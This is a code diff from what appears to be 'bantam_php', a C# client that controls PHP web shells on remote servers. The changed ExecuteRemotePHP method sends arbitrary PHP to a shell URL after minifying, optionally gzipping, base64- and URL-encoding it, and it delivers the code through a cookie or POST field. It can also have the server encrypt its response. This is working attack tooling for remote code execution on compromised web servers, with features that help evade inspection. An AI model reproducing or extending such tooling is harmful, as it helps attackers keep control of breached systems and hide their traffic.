@@ -165,8 +165,10 @@ namespace bantam_php
 
                 if (removeHeader) {
                     int headerSize = 14;
+
                     Byte[] bytesWithoutHeader = new Byte[compressedBytes.Length - headerSize];
                     Buffer.BlockCopy(compressedBytes, headerSize, bytesWithoutHeader, 0, bytesWithoutHeader.Length);
+
                     return bytesWithoutHeader;
                 } else {
                     return compressedBytes;
@@ -178,17 +180,17 @@ namespace bantam_php
         /// 
         /// </summary>
         /// <param name="url"></param>
-        /// <param name="code"></param>
+        /// <param name="phpCode"></param>
         /// <returns></returns>
-        public static async Task<ResponseObject> ExecuteRemotePHP(string url, string code, bool encryptResponse)
+        public static async Task<ResponseObject> ExecuteRemotePHP(string url, string phpCode, bool encryptResponse)
         {
             string encryptionKey = string.Empty,
                    encryptionIV = string.Empty;
 
-            string requestArgsName = BantamMain.Shells[url].requestArgName;
             bool sendViaCookie = BantamMain.Shells[url].sendDataViaCookie;
-            int responseEncryptionMode = BantamMain.Shells[url].responseEncryptionMode;
             bool gzipRequestData = BantamMain.Shells[url].gzipRequestData;
+            string requestArgsName = BantamMain.Shells[url].requestArgName;
+            int responseEncryptionMode = BantamMain.Shells[url].responseEncryptionMode;
 
             try {
                 HttpMethod method;
@@ -204,39 +206,45 @@ namespace bantam_php
                 //HttpClientHandler handler = new HttpClientHandler();
                 //handler.AutomaticDecompression = System.Net.DecompressionMethods.GZip;
 
-                if (!string.IsNullOrEmpty(code)) {
+                if (!string.IsNullOrEmpty(phpCode)) {
                     if (encryptResponse) {
-                        code += PhpHelper.EncryptPhpVariableAndEcho(responseEncryptionMode, ref encryptionKey, ref encryptionIV);
+                        phpCode += PhpHelper.EncryptPhpVariableAndEcho(responseEncryptionMode, ref encryptionKey, ref encryptionIV);
                     }
 
-                    string minifiedCode = Helper.MinifyCode(code);
-                    byte[] originalBytes = Encoding.UTF8.GetBytes(minifiedCode);
+                    phpCode = Helper.MinifyCode(phpCode);
 
                     if (gzipRequestData) {
-                        originalBytes = gzCompress(originalBytes);
+                        byte[] phpCodeBytes = Encoding.UTF8.GetBytes(phpCode);
+                        phpCodeBytes = gzCompress(phpCodeBytes);
+                        phpCode = Convert.ToBase64String(phpCodeBytes);
+                    } else {
+                        phpCode = Helper.EncodeBase64ToString(phpCode);
                     }
 
-                    string b64EncodedCode = Convert.ToBase64String(originalBytes);
+                    phpCode = HttpUtility.UrlEncode(phpCode);
 
                     if (sendViaCookie) {
-                        string urlEncodedCode = HttpUtility.UrlEncode(b64EncodedCode);
-                        request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + urlEncodedCode);
-                    } else {
-                        var values = new Dictionary<string, string> {
-                            { requestArgsName, b64EncodedCode }
-                        };
 
-                        var content = new FormUrlEncodedContent(values);
-                        request.Content = content;
+                        request.Headers.TryAddWithoutValidation("Cookie", requestArgsName + "=" + phpCode);
+                    } else {
+                        string postArgs = string.Format(requestArgsName+"={0}", phpCode);
+                        request.Content = new StringContent(postArgs, Encoding.UTF8, "application/x-www-form-urlencoded");
                     }
                 }
 
-                var response = await client.SendAsync(request);
-                var responseString = await response.Content.ReadAsStringAsync();
+                //using (HttpResponseMessage response = await client.GetAsync(url, HttpCompletionOption.ResponseHeadersRead))
 
-                return new ResponseObject(responseString, encryptionKey, encryptionIV);
-            } catch (System.Net.Http.HttpRequestException) {
-                MessageBox.Show("Fucking fuck everything got fucked");
+                using (HttpResponseMessage response = await client.SendAsync(request, HttpCompletionOption.ResponseHeadersRead)) 
+                { 
+                    var responseString = await response.Content.ReadAsStringAsync();
+                    return new ResponseObject(responseString, encryptionKey, encryptionIV);
+                }
+            } catch (System.Net.Http.HttpRequestException e) {
+                //todo level 2/3 logging
+                MessageBox.Show(e.Message);
+            } catch (Exception e) {
+                //todo level 2/3 logging
+                MessageBox.Show(e.Message);
             }
             return new ResponseObject(string.Empty, string.Empty, string.Empty);
         }
